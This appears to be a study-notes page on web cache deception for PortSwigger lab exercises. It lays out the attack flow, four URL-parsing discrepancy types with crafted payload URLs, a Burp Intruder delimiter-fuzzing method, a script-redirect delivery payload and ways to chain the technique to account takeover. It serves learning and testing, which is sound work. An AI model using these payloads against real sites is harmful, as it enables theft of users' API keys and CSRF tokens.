# Web cache deception — topic overview & router

Web Cache Deception (WCD) tricks a caching layer into storing a victim's sensitive, per-user response (API key, CSRF token, account page) at a URL that the attacker can then fetch publicly. The cache thinks it's a static file; the origin still served the authenticated response.

## Attack flow

```
1. Find target endpoint: GET /my-account  ->  response contains API key / CSRF token
2. Craft URL that:
   - Origin still serves /my-account for  (path mapping, delimiter, or normalization trick)
   - Cache treats as cacheable  (matches .js extension rule, /resources prefix, exact-match /robots.txt)
3. Deliver crafted URL to victim (exploit server <script>document.location=...</script>)
4. Cache stores victim's sensitive response under crafted URL
5. Attacker fetches same URL  ->  reads victim's API key / CSRF token
```

## 30-second quick reference

```
# Type 1 — Path mapping (origin abstracts path)
/my-account/wcd.js
   origin: serves /my-account  (ignores extra segments)
   cache:  stores .js extension  ->  X-Cache: hit

# Type 2 — Delimiter discrepancy (origin uses ; cache doesn't)
/my-account;wcd.js
   origin: ; is delimiter  ->  serves /my-account
   cache:  no ; handling  ->  sees /my-account;wcd.js, matches .js rule  ->  stores it

# Type 3 — Origin normalization (origin decodes ..%2f, cache doesn't)
/resources/..%2fmy-account
   origin: decodes ..%2f  ->  serves /my-account
   cache:  doesn't normalize  ->  sees /resources/... path  ->  matches /resources prefix rule  ->  stores it

# Type 4 — Cache normalization (cache decodes ..%2f, origin doesn't)
/my-account%23%2f%2e%2e%2fresources
   origin: %23 is delimiter  ->  serves /my-account
   cache:  normalizes %2f%2e%2e%2f  ->  resolves to /resources prefix  ->  matches rule  ->  stores it

# After crafting, deliver to victim:
<script>document.location="https://LAB-ID.web-security-academy.net/<CRAFTED-URL>?cachebust=1"</script>
# Then fetch same URL in Burp -> victim's data in response
```

## Testing methodology

```
Step 1: Identify target
  GET /my-account  ->  contains API key or CSRF token? (check response body + X-Cache header presence)

Step 2: Path mapping check
  /my-account/abc  ->  200 with data? (origin abstracts)
  /my-account/abc.js  ->  X-Cache: miss then hit? -> TYPE 1 confirmed

Step 3: Delimiter discovery (if path mapping fails)
  Intruder: GET /my-account§§abc  (Sniper; deselect URL-encode in payload encoding)
  Payload list: ; ? # % ! @ $ , + = ^ | ~ ` { } \ (all special chars)
  Chars returning 200 = delimiters for origin
  For each delimiter char D: /my-account<D>abc.js -> X-Cache miss then hit? -> TYPE 2

Step 4: Normalization check (if delimiters all fail or cache also uses them)
  /aaa/..%2fmy-account  ->  200? (origin normalizes)  =>  origin-normalizes
  /resources/..%2fX    ->  X-Cache miss then hit?   =>  cache has /resources rule
  -> TYPE 3: /resources/..%2fmy-account

  /aaa/..%2fresources/X  ->  X-Cache miss then hit? (cache normalizes)
  -> TYPE 4: /my-account<delimiter>%2f%2e%2e%2fresources
```

## Decision map

| Observation | Sub-technique | Payload |
|---|---|---|
| /my-account/abc returns 200+data | [Path-mapping-and-delimiters](Path-mapping-and-delimiters/) | /my-account/wcd.js |
| Delimiter char (;) gives 200; /my-account;.js cached | [Path-mapping-and-delimiters](Path-mapping-and-delimiters/) | /my-account;wcd.js |
| Origin normalizes ..%2f; cache has /resources rule | [Path-mapping-and-delimiters](Path-mapping-and-delimiters/) | /resources/..%2fmy-account |
| Cache normalizes ..%2f; origin uses % delimiter | [Cache-normalization](Cache-normalization/) | /my-account%23%2f%2e%2e%2fresources |
| Cache normalizes; exact-match rule (/robots.txt) | [Cache-normalization](Cache-normalization/) | /my-account;%2f%2e%2e%2frobots.txt |

## Sub-technique folders
- `Path-mapping-and-delimiters/` — origin abstracts path, delimiter discrepancy, origin normalization (3 labs)
- `Cache-normalization/` — cache decodes dot-segments the origin doesn't; exact-match cache rules (2 labs)

## Root cause
Cache and origin server parse URLs differently. The cache decides "is this cacheable?" based on the URL; the origin decides "what content to serve?" If their URL parsing disagrees (on path segments, delimiters, or encoded dot-segments), an attacker can craft a URL that the cache treats as static (caches it) but the origin treats as a dynamic sensitive endpoint (serves authenticated data).

## Find it
- Any authenticated endpoint that returns per-user data (account page, API key endpoint, profile).
- Any site with `X-Cache` response headers → a caching layer is present.
- Check `Cache-Control: no-store` / `Vary: Cookie` — if absent or misconfigured → cacheable.

## Chaining
- WCD + API key → account takeover without credentials
- WCD + CSRF token → CSRF attack bypassing CSRF defenses → email/password change
- WCD + [CSRF](../CSRF/) → full account compromise even on CSRF-protected apps
- WCD + [Authentication](../Authentication/) bypass → admin takeover

## Tools
- **Burp Repeater** — test each URL variant, check X-Cache header
- **Burp Intruder** — Sniper attack to brute delimiter characters (deselect URL-encode!)
- **Exploit server** — deliver `<script>document.location=...</script>` to victim

## References
- https://portswigger.net/web-security/web-cache-deception
